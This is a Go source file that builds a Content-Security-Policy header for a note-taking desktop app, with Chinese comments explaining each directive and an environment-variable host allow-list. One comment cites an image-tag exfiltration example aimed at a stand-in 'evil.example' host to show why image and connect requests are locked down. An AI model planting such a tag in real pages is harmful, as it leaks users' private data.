// Package security 集中放置应用级安全策略：内容安全策略（CSP），
// 以及后续要加的插件信任模型（trust level / 授权状态）。
//
// 放在独立包而不是散落在 main.go，有两个原因：
//  1. 可单测——根包测试会触发 //go:embed all:frontend/dist，dist 缺失就编译不过；
//  2. 让 main.go 保持纯装配职责（与既有的分层约定一致）。
package security

import (
	"os"
	"strings"
)

// AllowedHostsEnv 控制 CSP 外联白名单的环境变量名。
const AllowedHostsEnv = "NOTEVAULT_CSP_ALLOWED_HOSTS"

// AllowedHosts 返回 CSP 外联白名单（环境变量 NOTEVAULT_CSP_ALLOWED_HOSTS，逗号分隔）。
// 默认为空，即前端一律不允许对外发起请求。
//
// 这只约束「前端发起」的请求。Go 后端自己发出的请求不受影响——
// QnA / Summarize 调用 LLM API 走的是 Go 的 http.Client，不经过 WebView。
func AllowedHosts() []string {
	raw := os.Getenv(AllowedHostsEnv)
	if strings.TrimSpace(raw) == "" {
		return nil
	}
	hosts := make([]string, 0, 4)
	for _, h := range strings.Split(raw, ",") {
		if h = strings.TrimSpace(h); h != "" {
			hosts = append(hosts, h)
		}
	}
	return hosts
}

// ContentSecurityPolicy 构建 Content-Security-Policy 响应头。
//
// 为什么必须有它：插件（尤其 full-trust 主进程模式）能执行任意 JS。
// 仅仅在沙箱里禁掉 fetch 是不够的——`<img src="http://evil.example/?d=...">`、
// 字体请求、DNS 查询都能在完全拿不到 fetch 的情况下把笔记数据带走。
// 只有 CSP 的 connect-src / img-src 能真正掐断这些旁路。
//
// 兼容性要点（改动前务必回看这三条，放宽错地方就等于把门打开了）：
//   - wails runtime 通过 fetch(window.location.origin + "/wails/runtime") 调用后端，
//     属同源请求，connect-src 'self' 可以放行，收紧会直接搞挂整个应用；
//   - 插件 Worker 由 createObjectURL + new Worker 创建，
//     因此 script-src / worker-src 必须放行 blob:；
//   - mainThreadTransport 用 new Function('notevault', src) 执行 full-trust 插件源码，
//     在 CSP 看来这就是 eval，所以 script-src 还必须放行 'unsafe-eval'。
//     这条入口本来就在控制之下（只有用户显式授权的 full-trust 插件才走主进程），
//     收紧它会把主进程模式卡掉（启动时抛 "unsafe-eval not allowed"）。
func ContentSecurityPolicy() string {
	directives := []struct{ name, value string }{
		{name: "default-src", value: "'self'"},
		{name: "script-src", value: "'self' 'unsafe-inline' 'unsafe-eval' blob:"},
		{name: "worker-src", value: "blob: 'self'"},
		{name: "style-src", value: "'self' 'unsafe-inline'"},
		{name: "img-src", value: "'self' data: blob:"},
		{name: "font-src", value: "'self' data:"},
		{name: "connect-src", value: "'self'"},
		{name: "object-src", value: "'none'"},
		{name: "base-uri", value: "'none'"},
		{name: "frame-ancestors", value: "'none'"},
	}

	// 白名单只放宽「能发出请求的通道」的两条指令，不扩散到 script-src 等执行类指令。
	if hosts := AllowedHosts(); len(hosts) > 0 {
		extra := " " + strings.Join(hosts, " ")
		for i := range directives {
			switch directives[i].name {
			case "connect-src", "img-src":
				directives[i].value += extra
			}
		}
	}

	parts := make([]string, 0, len(directives))
	for _, d := range directives {
		parts = append(parts, d.name+" "+d.value)
	}
	return strings.Join(parts, "; ")
}
